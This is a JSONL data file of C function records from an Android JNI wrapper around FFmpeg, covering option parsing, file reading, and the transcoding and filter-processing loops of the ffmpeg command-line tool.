{"docstring": "/*\n * Finish parsing an option group.\n *\n * @param group_idx which group definition should this group belong to\n * @param arg argument of the group delimiting option\n */\n", "func_signal": "static void finish_group(OptionParseContext *octx, int group_idx,\n                         const char *arg)", "code": "{\n    OptionGroupList *l = &octx->groups[group_idx];\n    OptionGroup *g;\n\n    GROW_ARRAY(l->groups, l->nb_groups);\n    g = &l->groups[l->nb_groups - 1];\n\n    *g             = octx->cur_group;\n    g->arg         = arg;\n    g->group_def   = l->group_def;\n#if CONFIG_SWSCALE\n    g->sws_opts    = sws_opts;\n#endif\n    g->swr_opts    = swr_opts;\n    g->codec_opts  = codec_opts;\n    g->format_opts = format_opts;\n    g->resample_opts = resample_opts;\n\n    codec_opts  = NULL;\n    format_opts = NULL;\n    resample_opts = NULL;\n#if CONFIG_SWSCALE\n    sws_opts    = NULL;\n#endif\n    swr_opts    = NULL;\n    init_opts();\n\n    memset(&octx->cur_group, 0, sizeof(octx->cur_group));\n}", "path": "library\\jni\\cmdutils.c", "repo_name": "dxjia/ffmpeg-commands-executor-library", "stars": 169, "license": "apache-2.0", "language": "c", "size": 12384}
{"docstring": "/* end of sub2video hack */\n", "func_signal": "static void term_exit_sigsafe(void)", "code": "{\n#if HAVE_TERMIOS_H\n    if(restore_tty)\n        tcsetattr (0, TCSANOW, &oldtty);\n#endif\n}", "path": "library\\jni\\FFmpegNativeHelper.c", "repo_name": "dxjia/ffmpeg-commands-executor-library", "stars": 169, "license": "apache-2.0", "language": "c", "size": 12384}
{"docstring": "/* read file contents into a string */\n", "func_signal": "static uint8_t *read_file(const char *filename)", "code": "{\n    AVIOContext *pb      = NULL;\n    AVIOContext *dyn_buf = NULL;\n    int ret = avio_open(&pb, filename, AVIO_FLAG_READ);\n    uint8_t buf[1024], *str;\n\n    if (ret < 0) {\n        av_log(NULL, AV_LOG_ERROR, \"Error opening file %s.\\n\", filename);\n        return NULL;\n    }\n\n    ret = avio_open_dyn_buf(&dyn_buf);\n    if (ret < 0) {\n        avio_closep(&pb);\n        return NULL;\n    }\n    while ((ret = avio_read(pb, buf, sizeof(buf))) > 0)\n        avio_write(dyn_buf, buf, ret);\n    avio_w8(dyn_buf, 0);\n    avio_closep(&pb);\n\n    ret = avio_close_dyn_buf(dyn_buf, &str);\n    if (ret < 0)\n        return NULL;\n    return str;\n}", "path": "library\\jni\\ffmpeg_opt.c", "repo_name": "dxjia/ffmpeg-commands-executor-library", "stars": 169, "license": "apache-2.0", "language": "c", "size": 12384}
{"docstring": "/*\n * Check whether a packet from ist should be written into ost at this time\n */\n", "func_signal": "static int check_output_constraints(InputStream *ist, OutputStream *ost)", "code": "{\n    OutputFile *of = output_files[ost->file_index];\n    int ist_index  = input_files[ist->file_index]->ist_index + ist->st->index;\n\n    if (ost->source_index != ist_index)\n        return 0;\n\n    if (ost->finished)\n        return 0;\n\n    if (of->start_time != AV_NOPTS_VALUE && ist->pts < of->start_time)\n        return 0;\n\n    return 1;\n}", "path": "library\\jni\\FFmpegNativeHelper.c", "repo_name": "dxjia/ffmpeg-commands-executor-library", "stars": 169, "license": "apache-2.0", "language": "c", "size": 12384}
{"docstring": "/* Return 1 if there remain streams where more output is wanted, 0 otherwise. */\n", "func_signal": "static int need_output(void)", "code": "{\n    int i;\n\n    for (i = 0; i < nb_output_streams; i++) {\n        OutputStream *ost    = output_streams[i];\n        OutputFile *of       = output_files[ost->file_index];\n        AVFormatContext *os  = output_files[ost->file_index]->ctx;\n\n        if (ost->finished ||\n            (os->pb && avio_tell(os->pb) >= of->limit_filesize))\n            continue;\n        if (ost->frame_number >= ost->max_frames) {\n            int j;\n            for (j = 0; j < of->ctx->nb_streams; j++)\n                close_output_stream(output_streams[of->ost_index + j]);\n            continue;\n        }\n\n        return 1;\n    }\n\n    return 0;\n}", "path": "library\\jni\\FFmpegNativeHelper.c", "repo_name": "dxjia/ffmpeg-commands-executor-library", "stars": 169, "license": "apache-2.0", "language": "c", "size": 12384}
{"docstring": "/**\n * Run a single step of transcoding.\n *\n * @return  0 for success, <0 for error\n */\n", "func_signal": "static int transcode_step(void)", "code": "{\n    OutputStream *ost;\n    InputStream  *ist;\n    int ret;\n\n    ost = choose_output();\n    if (!ost) {\n        if (got_eagain()) {\n            reset_eagain();\n            av_usleep(10000);\n            return 0;\n        }\n        av_log(NULL, AV_LOG_VERBOSE, \"No more inputs to read from, finishing.\\n\");\n        return AVERROR_EOF;\n    }\n\n    if (ost->filter) {\n        if ((ret = transcode_from_filter(ost->filter->graph, &ist)) < 0)\n            return ret;\n        if (!ist)\n            return 0;\n    } else {\n        av_assert0(ost->source_index >= 0);\n        ist = input_streams[ost->source_index];\n    }\n\n    ret = process_input(ist->file_index);\n    if (ret == AVERROR(EAGAIN)) {\n        if (input_files[ist->file_index]->eagain)\n            ost->unavailable = 1;\n        return 0;\n    }\n\n    if (ret < 0)\n        return ret == AVERROR_EOF ? 0 : ret;\n\n    return reap_filters(0);\n}", "path": "library\\jni\\FFmpegNativeHelper.c", "repo_name": "dxjia/ffmpeg-commands-executor-library", "stars": 169, "license": "apache-2.0", "language": "c", "size": 12384}
{"docstring": "/* sub2video hack:\n   Convert subtitles to video with alpha to insert them in filter graphs.\n   This is a temporary solution until libavfilter gets real subtitles support.\n */\n", "func_signal": "static int sub2video_get_blank_frame(InputStream *ist)", "code": "{\n    int ret;\n    AVFrame *frame = ist->sub2video.frame;\n\n    av_frame_unref(frame);\n    ist->sub2video.frame->width  = ist->sub2video.w;\n    ist->sub2video.frame->height = ist->sub2video.h;\n    ist->sub2video.frame->format = AV_PIX_FMT_RGB32;\n    if ((ret = av_frame_get_buffer(frame, 32)) < 0)\n        return ret;\n    memset(frame->data[0], 0, frame->height * frame->linesize[0]);\n    return 0;\n}", "path": "library\\jni\\FFmpegNativeHelper.c", "repo_name": "dxjia/ffmpeg-commands-executor-library", "stars": 169, "license": "apache-2.0", "language": "c", "size": 12384}
{"docstring": "/* read a key without blocking */\n", "func_signal": "static int read_key(void)", "code": "{\n    unsigned char ch;\n#if HAVE_TERMIOS_H\n    int n = 1;\n    struct timeval tv;\n    fd_set rfds;\n\n    FD_ZERO(&rfds);\n    FD_SET(0, &rfds);\n    tv.tv_sec = 0;\n    tv.tv_usec = 0;\n    n = select(1, &rfds, NULL, NULL, &tv);\n    if (n > 0) {\n        n = read(0, &ch, 1);\n        if (n == 1)\n            return ch;\n\n        return n;\n    }\n#elif HAVE_KBHIT\n#    if HAVE_PEEKNAMEDPIPE\n    static int is_pipe;\n    static HANDLE input_handle;\n    DWORD dw, nchars;\n    if(!input_handle){\n        input_handle = GetStdHandle(STD_INPUT_HANDLE);\n        is_pipe = !GetConsoleMode(input_handle, &dw);\n    }\n\n    if (stdin->_cnt > 0) {\n        read(0, &ch, 1);\n        return ch;\n    }\n    if (is_pipe) {\n        /* When running under a GUI, you will end here. */\n        if (!PeekNamedPipe(input_handle, NULL, 0, NULL, &nchars, NULL)) {\n            // input pipe may have been closed by the program that ran ffmpeg\n            return -1;\n        }\n        //Read it\n        if(nchars != 0) {\n            read(0, &ch, 1);\n            return ch;\n        }else{\n            return -1;\n        }\n    }\n#    endif\n    if(kbhit())\n        return(getch());\n#endif\n    return -1;\n}", "path": "library\\jni\\FFmpegNativeHelper.c", "repo_name": "dxjia/ffmpeg-commands-executor-library", "stars": 169, "license": "apache-2.0", "language": "c", "size": 12384}
{"docstring": "/* HAVE_COMMANDLINETOARGVW */\n", "func_signal": "static int write_option(void *optctx, const OptionDef *po, const char *opt,\n                        const char *arg)", "code": "{\n    /* new-style options contain an offset into optctx, old-style address of\n     * a global var*/\n    void *dst = po->flags & (OPT_OFFSET | OPT_SPEC) ?\n                (uint8_t *)optctx + po->u.off : po->u.dst_ptr;\n    int *dstcount;\n\n    if (po->flags & OPT_SPEC) {\n        SpecifierOpt **so = dst;\n        char *p = strchr(opt, ':');\n        char *str;\n\n        dstcount = (int *)(so + 1);\n        *so = grow_array(*so, sizeof(**so), dstcount, *dstcount + 1);\n        str = av_strdup(p ? p + 1 : \"\");\n        if (!str)\n            return AVERROR(ENOMEM);\n        (*so)[*dstcount - 1].specifier = str;\n        dst = &(*so)[*dstcount - 1].u;\n    }\n\n    if (po->flags & OPT_STRING) {\n        char *str;\n        str = av_strdup(arg);\n        av_freep(dst);\n        if (!str)\n            return AVERROR(ENOMEM);\n        *(char **)dst = str;\n    } else if (po->flags & OPT_BOOL || po->flags & OPT_INT) {\n        *(int *)dst = parse_number_or_die(opt, arg, OPT_INT64, INT_MIN, INT_MAX);\n    } else if (po->flags & OPT_INT64) {\n        *(int64_t *)dst = parse_number_or_die(opt, arg, OPT_INT64, INT64_MIN, INT64_MAX);\n    } else if (po->flags & OPT_TIME) {\n        *(int64_t *)dst = parse_time_or_die(opt, arg, 1);\n    } else if (po->flags & OPT_FLOAT) {\n        *(float *)dst = parse_number_or_die(opt, arg, OPT_FLOAT, -INFINITY, INFINITY);\n    } else if (po->flags & OPT_DOUBLE) {\n        *(double *)dst = parse_number_or_die(opt, arg, OPT_DOUBLE, -INFINITY, INFINITY);\n    } else if (po->u.func_arg) {\n        if (po->flags == OPT_EXIT) {\n            reset_record();\n        }\n        int ret = po->u.func_arg(optctx, opt, arg);\n        if (ret < 0) {\n            av_log(NULL, AV_LOG_ERROR,\n                   \"Failed to set value '%s' for option '%s': %s\\n\",\n                   arg, opt, av_err2str(ret));\n            return ret;\n        }\n    }\n    if (po->flags & OPT_EXIT)\n        exit_program(0);\n\n    return 0;\n}", "path": "library\\jni\\cmdutils.c", "repo_name": "dxjia/ffmpeg-commands-executor-library", "stars": 169, "license": "apache-2.0", "language": "c", "size": 12384}
{"docstring": "/**\n * Perform a step of transcoding for the specified filter graph.\n *\n * @param[in]  graph     filter graph to consider\n * @param[out] best_ist  input stream where a frame would allow to continue\n * @return  0 for success, <0 for error\n */\n", "func_signal": "static int transcode_from_filter(FilterGraph *graph, InputStream **best_ist)", "code": "{\n    int i, ret;\n    int nb_requests, nb_requests_max = 0;\n    InputFilter *ifilter;\n    InputStream *ist;\n\n    *best_ist = NULL;\n    ret = avfilter_graph_request_oldest(graph->graph);\n    if (ret >= 0)\n        return reap_filters(0);\n\n    if (ret == AVERROR_EOF) {\n        ret = reap_filters(1);\n        for (i = 0; i < graph->nb_outputs; i++)\n            close_output_stream(graph->outputs[i]->ost);\n        return ret;\n    }\n    if (ret != AVERROR(EAGAIN))\n        return ret;\n\n    for (i = 0; i < graph->nb_inputs; i++) {\n        ifilter = graph->inputs[i];\n        ist = ifilter->ist;\n        if (input_files[ist->file_index]->eagain ||\n            input_files[ist->file_index]->eof_reached)\n            continue;\n        nb_requests = av_buffersrc_get_nb_failed_requests(ifilter->filter);\n        if (nb_requests > nb_requests_max) {\n            nb_requests_max = nb_requests;\n            *best_ist = ist;\n        }\n    }\n\n    if (!*best_ist)\n        for (i = 0; i < graph->nb_outputs; i++)\n            graph->outputs[i]->ost->unavailable = 1;\n\n    return 0;\n}", "path": "library\\jni\\FFmpegNativeHelper.c", "repo_name": "dxjia/ffmpeg-commands-executor-library", "stars": 169, "license": "apache-2.0", "language": "c", "size": 12384}
{"docstring": "/* return a copy of the input with the stream specifiers removed from the keys */\n", "func_signal": "static AVDictionary *strip_specifiers(AVDictionary *dict)", "code": "{\n    AVDictionaryEntry *e = NULL;\n    AVDictionary    *ret = NULL;\n\n    while ((e = av_dict_get(dict, \"\", e, AV_DICT_IGNORE_SUFFIX))) {\n        char *p = strchr(e->key, ':');\n\n        if (p)\n            *p = 0;\n        av_dict_set(&ret, e->key, e->value, 0);\n        if (p)\n            *p = ':';\n    }\n    return ret;\n}", "path": "library\\jni\\ffmpeg_opt.c", "repo_name": "dxjia/ffmpeg-commands-executor-library", "stars": 169, "license": "apache-2.0", "language": "c", "size": 12384}
{"docstring": "/*\n * Return\n * - 0 -- one packet was read and processed\n * - AVERROR(EAGAIN) -- no packets were available for selected file,\n *   this function should be called again\n * - AVERROR_EOF -- this function should not be called again\n */\n", "func_signal": "static int process_input(int file_index)", "code": "{\n    InputFile *ifile = input_files[file_index];\n    AVFormatContext *is;\n    InputStream *ist;\n    AVPacket pkt;\n    int ret, i, j;\n\n    is  = ifile->ctx;\n    ret = get_input_packet(ifile, &pkt);\n\n    if (ret == AVERROR(EAGAIN)) {\n        ifile->eagain = 1;\n        return ret;\n    }\n    if (ret < 0) {\n        if (ret != AVERROR_EOF) {\n            print_error(is->filename, ret);\n            if (exit_on_error)\n                loge(\"Error, %s\", __FUNCTION__);\n        }\n\n        for (i = 0; i < ifile->nb_streams; i++) {\n            ist = input_streams[ifile->ist_index + i];\n            if (ist->decoding_needed) {\n                ret = process_input_packet(ist, NULL);\n                if (ret>0)\n                    return 0;\n            }\n\n            /* mark all outputs that don't go through lavfi as finished */\n            for (j = 0; j < nb_output_streams; j++) {\n                OutputStream *ost = output_streams[j];\n\n                if (ost->source_index == ifile->ist_index + i &&\n                    (ost->stream_copy || ost->enc->type == AVMEDIA_TYPE_SUBTITLE))\n                    finish_output_stream(ost);\n            }\n        }\n\n        ifile->eof_reached = 1;\n        return AVERROR(EAGAIN);\n    }\n\n    reset_eagain();\n\n    if (do_pkt_dump) {\n        av_pkt_dump_log2(NULL, AV_LOG_DEBUG, &pkt, do_hex_dump,\n                         is->streams[pkt.stream_index]);\n    }\n    /* the following test is needed in case new streams appear\n       dynamically in stream : we ignore them */\n    if (pkt.stream_index >= ifile->nb_streams) {\n        report_new_stream(file_index, &pkt);\n        goto discard_packet;\n    }\n\n    ist = input_streams[ifile->ist_index + pkt.stream_index];\n\n    ist->data_size += pkt.size;\n    ist->nb_packets++;\n\n    if (ist->discard)\n        goto discard_packet;\n\n    if (debug_ts) {\n        av_log(NULL, AV_LOG_INFO, \"demuxer -> ist_index:%d type:%s \"\n               \"next_dts:%s next_dts_time:%s next_pts:%s next_pts_time:%s pkt_pts:%s pkt_pts_time:%s pkt_dts:%s pkt_dts_time:%s off:%s off_time:%s\\n\",\n               ifile->ist_index + pkt.stream_index, av_get_media_type_string(ist->dec_ctx->codec_type),\n               av_ts2str(ist->next_dts), av_ts2timestr(ist->next_dts, &AV_TIME_BASE_Q),\n               av_ts2str(ist->next_pts), av_ts2timestr(ist->next_pts, &AV_TIME_BASE_Q),\n               av_ts2str(pkt.pts), av_ts2timestr(pkt.pts, &ist->st->time_base),\n               av_ts2str(pkt.dts), av_ts2timestr(pkt.dts, &ist->st->time_base),\n               av_ts2str(input_files[ist->file_index]->ts_offset),\n               av_ts2timestr(input_files[ist->file_index]->ts_offset, &AV_TIME_BASE_Q));\n    }\n\n    if(!ist->wrap_correction_done && is->start_time != AV_NOPTS_VALUE && ist->st->pts_wrap_bits < 64){\n        int64_t stime, stime2;\n        // Correcting starttime based on the enabled streams\n        // FIXME this ideally should be done before the first use of starttime but we do not know which are the enabled streams at that point.\n        //       so we instead do it here as part of discontinuity handling\n        if (   ist->next_dts == AV_NOPTS_VALUE\n            && ifile->ts_offset == -is->start_time\n            && (is->iformat->flags & AVFMT_TS_DISCONT)) {\n            int64_t new_start_time = INT64_MAX;\n            for (i=0; i<is->nb_streams; i++) {\n                AVStream *st = is->streams[i];\n                if(st->discard == AVDISCARD_ALL || st->start_time == AV_NOPTS_VALUE)\n                    continue;\n                new_start_time = FFMIN(new_start_time, av_rescale_q(st->start_time, st->time_base, AV_TIME_BASE_Q));\n            }\n            if (new_start_time > is->start_time) {\n                av_log(is, AV_LOG_VERBOSE, \"Correcting start time by %\"PRId64\"\\n\", new_start_time - is->start_time);\n                ifile->ts_offset = -new_start_time;\n            }\n        }\n\n        stime = av_rescale_q(is->start_time, AV_TIME_BASE_Q, ist->st->time_base);\n        stime2= stime + (1ULL<<ist->st->pts_wrap_bits);\n        ist->wrap_correction_done = 1;\n\n        if(stime2 > stime && pkt.dts != AV_NOPTS_VALUE && pkt.dts > stime + (1LL<<(ist->st->pts_wrap_bits-1))) {\n            pkt.dts -= 1ULL<<ist->st->pts_wrap_bits;\n            ist->wrap_correction_done = 0;\n        }\n        if(stime2 > stime && pkt.pts != AV_NOPTS_VALUE && pkt.pts > stime + (1LL<<(ist->st->pts_wrap_bits-1))) {\n            pkt.pts -= 1ULL<<ist->st->pts_wrap_bits;\n            ist->wrap_correction_done = 0;\n        }\n    }\n\n    /* add the stream-global side data to the first packet */\n    if (ist->nb_packets == 1) {\n        if (ist->st->nb_side_data)\n            av_packet_split_side_data(&pkt);\n        for (i = 0; i < ist->st->nb_side_data; i++) {\n            AVPacketSideData *src_sd = &ist->st->side_data[i];\n            uint8_t *dst_data;\n\n            if (av_packet_get_side_data(&pkt, src_sd->type, NULL))\n                continue;\n\n            dst_data = av_packet_new_side_data(&pkt, src_sd->type, src_sd->size);\n            if (!dst_data)\n                loge(\"Error, %s\", __FUNCTION__);\n\n            memcpy(dst_data, src_sd->data, src_sd->size);\n        }\n    }\n\n    if (pkt.dts != AV_NOPTS_VALUE)\n        pkt.dts += av_rescale_q(ifile->ts_offset, AV_TIME_BASE_Q, ist->st->time_base);\n    if (pkt.pts != AV_NOPTS_VALUE)\n        pkt.pts += av_rescale_q(ifile->ts_offset, AV_TIME_BASE_Q, ist->st->time_base);\n\n    if (pkt.pts != AV_NOPTS_VALUE)\n        pkt.pts *= ist->ts_scale;\n    if (pkt.dts != AV_NOPTS_VALUE)\n        pkt.dts *= ist->ts_scale;\n\n    if ((ist->dec_ctx->codec_type == AVMEDIA_TYPE_VIDEO ||\n         ist->dec_ctx->codec_type == AVMEDIA_TYPE_AUDIO) &&\n        pkt.dts != AV_NOPTS_VALUE && ist->next_dts == AV_NOPTS_VALUE && !copy_ts\n        && (is->iformat->flags & AVFMT_TS_DISCONT) && ifile->last_ts != AV_NOPTS_VALUE) {\n        int64_t pkt_dts = av_rescale_q(pkt.dts, ist->st->time_base, AV_TIME_BASE_Q);\n        int64_t delta   = pkt_dts - ifile->last_ts;\n        if (delta < -1LL*dts_delta_threshold*AV_TIME_BASE ||\n            delta >  1LL*dts_delta_threshold*AV_TIME_BASE){\n            ifile->ts_offset -= delta;\n            av_log(NULL, AV_LOG_DEBUG,\n                   \"Inter stream timestamp discontinuity %\"PRId64\", new offset= %\"PRId64\"\\n\",\n                   delta, ifile->ts_offset);\n            pkt.dts -= av_rescale_q(delta, AV_TIME_BASE_Q, ist->st->time_base);\n            if (pkt.pts != AV_NOPTS_VALUE)\n                pkt.pts -= av_rescale_q(delta, AV_TIME_BASE_Q, ist->st->time_base);\n        }\n    }\n\n    if ((ist->dec_ctx->codec_type == AVMEDIA_TYPE_VIDEO ||\n         ist->dec_ctx->codec_type == AVMEDIA_TYPE_AUDIO) &&\n         pkt.dts != AV_NOPTS_VALUE && ist->next_dts != AV_NOPTS_VALUE &&\n        !copy_ts) {\n        int64_t pkt_dts = av_rescale_q(pkt.dts, ist->st->time_base, AV_TIME_BASE_Q);\n        int64_t delta   = pkt_dts - ist->next_dts;\n        if (is->iformat->flags & AVFMT_TS_DISCONT) {\n            if (delta < -1LL*dts_delta_threshold*AV_TIME_BASE ||\n                delta >  1LL*dts_delta_threshold*AV_TIME_BASE ||\n                pkt_dts + AV_TIME_BASE/10 < FFMAX(ist->pts, ist->dts)) {\n                ifile->ts_offset -= delta;\n                av_log(NULL, AV_LOG_DEBUG,\n                       \"timestamp discontinuity %\"PRId64\", new offset= %\"PRId64\"\\n\",\n                       delta, ifile->ts_offset);\n                pkt.dts -= av_rescale_q(delta, AV_TIME_BASE_Q, ist->st->time_base);\n                if (pkt.pts != AV_NOPTS_VALUE)\n                    pkt.pts -= av_rescale_q(delta, AV_TIME_BASE_Q, ist->st->time_base);\n            }\n        } else {\n            if ( delta < -1LL*dts_error_threshold*AV_TIME_BASE ||\n                 delta >  1LL*dts_error_threshold*AV_TIME_BASE) {\n                av_log(NULL, AV_LOG_WARNING, \"DTS %\"PRId64\", next:%\"PRId64\" st:%d invalid dropping\\n\", pkt.dts, ist->next_dts, pkt.stream_index);\n                pkt.dts = AV_NOPTS_VALUE;\n            }\n            if (pkt.pts != AV_NOPTS_VALUE){\n                int64_t pkt_pts = av_rescale_q(pkt.pts, ist->st->time_base, AV_TIME_BASE_Q);\n                delta   = pkt_pts - ist->next_dts;\n                if ( delta < -1LL*dts_error_threshold*AV_TIME_BASE ||\n                     delta >  1LL*dts_error_threshold*AV_TIME_BASE) {\n                    av_log(NULL, AV_LOG_WARNING, \"PTS %\"PRId64\", next:%\"PRId64\" invalid dropping st:%d\\n\", pkt.pts, ist->next_dts, pkt.stream_index);\n                    pkt.pts = AV_NOPTS_VALUE;\n                }\n            }\n        }\n    }\n\n    if (pkt.dts != AV_NOPTS_VALUE)\n        ifile->last_ts = av_rescale_q(pkt.dts, ist->st->time_base, AV_TIME_BASE_Q);\n\n    if (debug_ts) {\n        av_log(NULL, AV_LOG_INFO, \"demuxer+ffmpeg -> ist_index:%d type:%s pkt_pts:%s pkt_pts_time:%s pkt_dts:%s pkt_dts_time:%s off:%s off_time:%s\\n\",\n               ifile->ist_index + pkt.stream_index, av_get_media_type_string(ist->dec_ctx->codec_type),\n               av_ts2str(pkt.pts), av_ts2timestr(pkt.pts, &ist->st->time_base),\n               av_ts2str(pkt.dts), av_ts2timestr(pkt.dts, &ist->st->time_base),\n               av_ts2str(input_files[ist->file_index]->ts_offset),\n               av_ts2timestr(input_files[ist->file_index]->ts_offset, &AV_TIME_BASE_Q));\n    }\n\n    sub2video_heartbeat(ist, pkt.pts);\n\n    ret = process_input_packet(ist, &pkt);\n    if (ret < 0) {\n        av_log(NULL, AV_LOG_ERROR, \"Error while decoding stream #%d:%d: %s\\n\",\n               ist->file_index, ist->st->index, av_err2str(ret));\n        if (exit_on_error)\n            loge(\"Error, %s\", __FUNCTION__);\n    }\n\ndiscard_packet:\n    av_free_packet(&pkt);\n\n    return 0;\n}", "path": "library\\jni\\FFmpegNativeHelper.c", "repo_name": "dxjia/ffmpeg-commands-executor-library", "stars": 169, "license": "apache-2.0", "language": "c", "size": 12384}
{"docstring": "/*\n * The following code is the main loop of the file converter\n */\n", "func_signal": "static int transcode(void)", "code": "{\n    int ret, i;\n    AVFormatContext *os;\n    OutputStream *ost;\n    InputStream *ist;\n    int64_t timer_start;\n\n    ret = transcode_init();\n    if (ret < 0)\n        goto fail;\n\n    if (stdin_interaction) {\n        av_log(NULL, AV_LOG_INFO, \"Press [q] to stop, [?] for help\\n\");\n    }\n\n    timer_start = av_gettime_relative();\n\n#if HAVE_PTHREADS\n    if ((ret = init_input_threads()) < 0)\n        goto fail;\n#endif\n\n    while (!received_sigterm) {\n        int64_t cur_time= av_gettime_relative();\n\n        /* if 'q' pressed, exits */\n        if (stdin_interaction)\n            if (check_keyboard_interaction(cur_time) < 0)\n                break;\n\n        /* check if there's any stream where output is still needed */\n        if (!need_output()) {\n            av_log(NULL, AV_LOG_VERBOSE, \"No more output streams to write to, finishing.\\n\");\n            break;\n        }\n\n        ret = transcode_step();\n        if (ret < 0) {\n            if (ret == AVERROR_EOF || ret == AVERROR(EAGAIN)) {\n                continue;\n            } else {\n                char errbuf[128];\n                av_strerror(ret, errbuf, sizeof(errbuf));\n\n                av_log(NULL, AV_LOG_ERROR, \"Error while filtering: %s\\n\", errbuf);\n                break;\n            }\n        }\n\n        /* dump report by using the output first video and audio streams */\n        print_report(0, timer_start, cur_time);\n    }\n#if HAVE_PTHREADS\n    free_input_threads();\n#endif\n\n    /* at the end of stream, we must flush the decoder buffers */\n    for (i = 0; i < nb_input_streams; i++) {\n        ist = input_streams[i];\n        if (!input_files[ist->file_index]->eof_reached && ist->decoding_needed) {\n            process_input_packet(ist, NULL);\n        }\n    }\n    flush_encoders();\n\n    term_exit();\n\n    /* write the trailer if needed and close file */\n    for (i = 0; i < nb_output_files; i++) {\n        os = output_files[i]->ctx;\n        av_write_trailer(os);\n    }\n\n    /* dump report by using the first video and audio streams */\n    print_report(1, timer_start, av_gettime_relative());\n\n    /* close each encoder */\n    for (i = 0; i < nb_output_streams; i++) {\n        ost = output_streams[i];\n        if (ost->encoding_needed) {\n            av_freep(&ost->enc_ctx->stats_in);\n        }\n    }\n\n    /* close each decoder */\n    for (i = 0; i < nb_input_streams; i++) {\n        ist = input_streams[i];\n        if (ist->decoding_needed) {\n            avcodec_close(ist->dec_ctx);\n            if (ist->hwaccel_uninit)\n                ist->hwaccel_uninit(ist->dec_ctx);\n        }\n    }\n\n    /* finished ! */\n    ret = 0;\n\n fail:\n#if HAVE_PTHREADS\n    free_input_threads();\n#endif\n\n    if (output_streams) {\n        for (i = 0; i < nb_output_streams; i++) {\n            ost = output_streams[i];\n            if (ost) {\n                if (ost->logfile) {\n                    fclose(ost->logfile);\n                    ost->logfile = NULL;\n                }\n                av_freep(&ost->forced_kf_pts);\n                av_freep(&ost->apad);\n                av_freep(&ost->disposition);\n                av_dict_free(&ost->encoder_opts);\n                av_dict_free(&ost->swr_opts);\n                av_dict_free(&ost->resample_opts);\n                av_dict_free(&ost->bsf_args);\n            }\n        }\n    }\n    return ret;\n}", "path": "library\\jni\\FFmpegNativeHelper.c", "repo_name": "dxjia/ffmpeg-commands-executor-library", "stars": 169, "license": "apache-2.0", "language": "c", "size": 12384}
{"docstring": "/**\n * Get and encode new output from any of the filtergraphs, without causing\n * activity.\n *\n * @return  0 for success, <0 for severe errors\n */\n", "func_signal": "static int reap_filters(int flush)", "code": "{\n    AVFrame *filtered_frame = NULL;\n    int i;\n\n    /* Reap all buffers present in the buffer sinks */\n    for (i = 0; i < nb_output_streams; i++) {\n        OutputStream *ost = output_streams[i];\n        OutputFile    *of = output_files[ost->file_index];\n        AVFilterContext *filter;\n        AVCodecContext *enc = ost->enc_ctx;\n        int ret = 0;\n\n        if (!ost->filter)\n            continue;\n        filter = ost->filter->filter;\n\n        if (!ost->filtered_frame && !(ost->filtered_frame = av_frame_alloc())) {\n            return AVERROR(ENOMEM);\n        }\n        filtered_frame = ost->filtered_frame;\n\n        while (1) {\n            double float_pts = AV_NOPTS_VALUE; // this is identical to filtered_frame.pts but with higher precision\n            ret = av_buffersink_get_frame_flags(filter, filtered_frame,\n                                               AV_BUFFERSINK_FLAG_NO_REQUEST);\n            if (ret < 0) {\n                if (ret != AVERROR(EAGAIN) && ret != AVERROR_EOF) {\n                    av_log(NULL, AV_LOG_WARNING,\n                           \"Error in av_buffersink_get_frame_flags(): %s\\n\", av_err2str(ret));\n                } else if (flush) {\n                    if (filter->inputs[0]->type == AVMEDIA_TYPE_VIDEO)\n                        do_video_out(of->ctx, ost, NULL, AV_NOPTS_VALUE);\n                }\n                break;\n            }\n            if (ost->finished) {\n                av_frame_unref(filtered_frame);\n                continue;\n            }\n            if (filtered_frame->pts != AV_NOPTS_VALUE) {\n                int64_t start_time = (of->start_time == AV_NOPTS_VALUE) ? 0 : of->start_time;\n                AVRational tb = enc->time_base;\n                int extra_bits = av_clip(29 - av_log2(tb.den), 0, 16);\n\n                tb.den <<= extra_bits;\n                float_pts =\n                    av_rescale_q(filtered_frame->pts, filter->inputs[0]->time_base, tb) -\n                    av_rescale_q(start_time, AV_TIME_BASE_Q, tb);\n                float_pts /= 1 << extra_bits;\n                // avoid exact midoints to reduce the chance of rounding differences, this can be removed in case the fps code is changed to work with integers\n                float_pts += FFSIGN(float_pts) * 1.0 / (1<<17);\n\n                filtered_frame->pts =\n                    av_rescale_q(filtered_frame->pts, filter->inputs[0]->time_base, enc->time_base) -\n                    av_rescale_q(start_time, AV_TIME_BASE_Q, enc->time_base);\n            }\n            //if (ost->source_index >= 0)\n            //    *filtered_frame= *input_streams[ost->source_index]->decoded_frame; //for me_threshold\n\n            switch (filter->inputs[0]->type) {\n            case AVMEDIA_TYPE_VIDEO:\n                if (!ost->frame_aspect_ratio.num)\n                    enc->sample_aspect_ratio = filtered_frame->sample_aspect_ratio;\n\n                if (debug_ts) {\n                    av_log(NULL, AV_LOG_INFO, \"filter -> pts:%s pts_time:%s exact:%f time_base:%d/%d\\n\",\n                            av_ts2str(filtered_frame->pts), av_ts2timestr(filtered_frame->pts, &enc->time_base),\n                            float_pts,\n                            enc->time_base.num, enc->time_base.den);\n                }\n\n                do_video_out(of->ctx, ost, filtered_frame, float_pts);\n                break;\n            case AVMEDIA_TYPE_AUDIO:\n                if (!(enc->codec->capabilities & CODEC_CAP_PARAM_CHANGE) &&\n                    enc->channels != av_frame_get_channels(filtered_frame)) {\n                    av_log(NULL, AV_LOG_ERROR,\n                           \"Audio filter graph output is not normalized and encoder does not support parameter changes\\n\");\n                    break;\n                }\n                do_audio_out(of->ctx, ost, filtered_frame);\n                break;\n            default:\n                // TODO support subtitle filters\n                av_assert0(0);\n            }\n\n            av_frame_unref(filtered_frame);\n        }\n    }\n\n    return 0;\n}", "path": "library\\jni\\FFmpegNativeHelper.c", "repo_name": "dxjia/ffmpeg-commands-executor-library", "stars": 169, "license": "apache-2.0", "language": "c", "size": 12384}
